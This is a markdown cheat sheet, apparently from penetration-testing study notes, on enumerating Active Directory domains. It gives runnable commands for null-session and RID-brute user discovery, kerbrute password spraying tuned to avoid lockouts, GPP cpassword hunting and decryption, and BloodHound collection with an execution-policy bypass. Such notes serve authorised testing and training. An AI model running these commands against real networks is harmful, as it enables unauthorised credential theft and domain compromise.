# 🗂️ 02 — Domain Enumeration

---

## Attack Order

```
1. SMB null session → impacket-lookupsid / RID brute → users.txt
2. kerbrute userenum → validate / expand user list
3. ldapdomaindump → users, groups, computers, descriptions (firefox-viewable)
4. rpcclient → enumdomusers, enumdomgroups, password policy
5. enum4linux-ng → full sweep
6. SYSVOL → GPP cpassword hunt
7. BloodHound (once creds obtained)
```

---

## Environment Setup

```bash
export ip=10.10.10.x
export domain=corp.local
export user=
export pass=
```

---

## SMB Enumeration (No Creds)

```bash
# Check null session
nxc smb $ip -u '' -p ''
nxc smb $ip -u 'guest' -p ''

# List shares
nxc smb $ip -u '' -p '' --shares
smbclient -L //$ip -N

# Connect to a share
smbclient //$ip/SHARENAME -N

# RID brute → user list
nxc smb $ip -u '' -p '' --rid-brute | tee enum/raw-rid.txt
grep "SidTypeUser" enum/raw-rid.txt | awk -F'\\' '{print $2}' | awk '{print $1}' > enum/users.txt

# SID brute via impacket (no creds)
sudo impacket-lookupsid ''@$ip
# With creds
sudo impacket-lookupsid $domain/$user:$pass@$ip
```

---

## Kerbrute — User Validation & Password Spray

```bash
# Copy kerbrute binary to working directory
cp /home/kali/Arsenal/ActiveDirectory/Kerbrute/kerbrute .

# Username wordlist for AD
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/refs/heads/master/User.txt

# Username enumeration against DC
sudo ./kerbrute userenum ./User.txt --dc $ip -d $domain | tee enum/raw-kerbrute.txt
sudo ./kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  --dc $ip -d $domain | tee enum/raw-kerbrute.txt

# Extract valid usernames
grep "VALID USERNAME" enum/raw-kerbrute.txt | awk -F'@' '{print $1}' | awk '{print $NF}' >> enum/users.txt

# Alternative extract method
cat enum/raw-kerbrute.txt | cut -d "@" -f 1 | cut -d " " -f 14 >> enum/users.txt

# Deduplicate final user list
sort -u enum/users.txt -o enum/users.txt
cat enum/users.txt

# Password spray (check lockout policy first — see below)
sudo ./kerbrute passwordspray -d $domain enum/users.txt Password123 --dc $ip
```

---

## ldapdomaindump

```bash
# Create output folder — generates multiple files
mkdir -p enum/ldap/

# Dump with credentials
sudo ldapdomaindump ldaps://$ip -u "$domain\\$user" -p "$pass" -o enum/ldap/
sudo ldapdomaindump $ip -u "$domain\\$user" -p "$pass" -o enum/ldap/

# View in browser
firefox enum/ldap/domain_users.html
firefox enum/ldap/domain_computers.html
firefox enum/ldap/domain_groups.html

# ⚠️ ORANGE ICON = OU | PURPLE ICON = GPO Policy (BloodHound same convention)

# Check descriptions for plaintext credentials
grep -i "description" enum/ldap/domain_users.grep | grep -v "^$"
```

---

## RPC Enumeration

```bash
# Anonymous
rpcclient -U "" -N $ip

# With credentials
rpcclient -U "$user%$pass" $ip

# Inside rpcclient:
rpcclient> srvinfo
rpcclient> enumdomains
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> querygroup 0x200          # Domain Admins group
rpcclient> querygroupmem 0x200       # Members of Domain Admins
rpcclient> queryuser 0x1f4           # RID 500 = Administrator
rpcclient> getdompwinfo              # Password policy → lockout threshold
rpcclient> enumprinters
```

---

## Password Policy — Critical Before Spray

```bash
# Via nxc
nxc smb $ip -u $user -p $pass --pass-pol

# Via rpcclient
rpcclient> getdompwinfo
# Key values:
# min_password_length → minimum chars
# lockout_threshold → max bad attempts (0 = no lockout)
# lockout_observation_window → reset counter after N minutes

# ⚠️ Rule: spray max (threshold - 1) passwords per observation window
# ⚠️ If threshold = 0 → no lockout, brute force is safe
# ⚠️ Default safe: 1 spray per 30 minutes
```

---

## GPP / SYSVOL Credential Hunt

```bash
# SYSVOL is always readable by any domain user
smbclient //$ip/SYSVOL -U "$domain\\$user%$pass"

# Hunt for cpassword in Groups.xml (pre-MS14-025 GPP credentials)
find /mnt/sysvol -name "Groups.xml" 2>/dev/null
grep -r "cpassword" /mnt/sysvol/

# Decrypt GPP cpassword
gpp-decrypt CPASSWORD_VALUE

# Automated via nxc modules
nxc smb $ip -u $user -p $pass -M gpp_password
nxc smb $ip -u $user -p $pass -M gpp_autologin
```

---

## enum4linux-ng — Full Sweep

```bash
# Full unauthenticated sweep
enum4linux-ng $ip -oY enum/enum4linux.yml

# With credentials
enum4linux-ng $ip -u $user -p $pass -oY enum/enum4linux-auth.yml
```

---

## BloodHound CE Collection (With Creds)

```bash
# Start BloodHound CE
cd /home/kali/Arsenal/ActiveDirectory/BloodHoundCE
sudo docker-compose up -d
sudo docker ps

# Get initial password from logs
sudo docker logs bloodhoundce-bloodhound-1 | grep -i pass
# Login: http://localhost:8080  admin / (password from logs) → reset on first login

# Stop BloodHound CE
sudo docker-compose down

# Collect data — netexec method (from Kali)
sudo nxc ldap $ip -u $user -p $pass --bloodhound --collection All --dns-server $ip

# SharpHound.exe — on Windows target
SharpHound.exe -c All
SharpHound.exe -c All --output-directory C:\Windows\Tasks\

# SharpHound.ps1 — PowerShell version
Import-Module .\SharpHound.ps1
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Tasks\

# Import zip → BloodHound CE → http://localhost:8080
# Right-click owned nodes → "Mark as Owned"
```

### Key BloodHound Queries

```
Shortest Paths to Domain Admins from Owned
Find Principals with DCSync Rights
Find AS-REP Roastable Users (DontReqPreAuth)
Find Kerberoastable Users
Computers where Domain Users are Local Admin
Computers with Unsupported Operating Systems
```

---

## Checklist

```
[ ] SMB null session attempted
[ ] impacket-lookupsid / RID brute → users.txt populated
[ ] kerbrute validation run → users confirmed
[ ] ldapdomaindump run → HTML files reviewed in browser
[ ] Descriptions checked for plaintext credentials
[ ] Password policy retrieved (lockout threshold known)
[ ] SYSVOL / GPP checked for cpassword
[ ] Shares enumerated → interesting files noted
[ ] BloodHound collected (once creds available)
```

---

**MITRE ATT&CK:** T1087 (Account Discovery) · T1069 (Permission Groups Discovery) · T1615 (Group Policy Discovery) · T1018 (Remote System Discovery)

[← Recon](../01-recon/README.md) | [Next: Credential Attacks →](../03-credential-attacks/README.md)
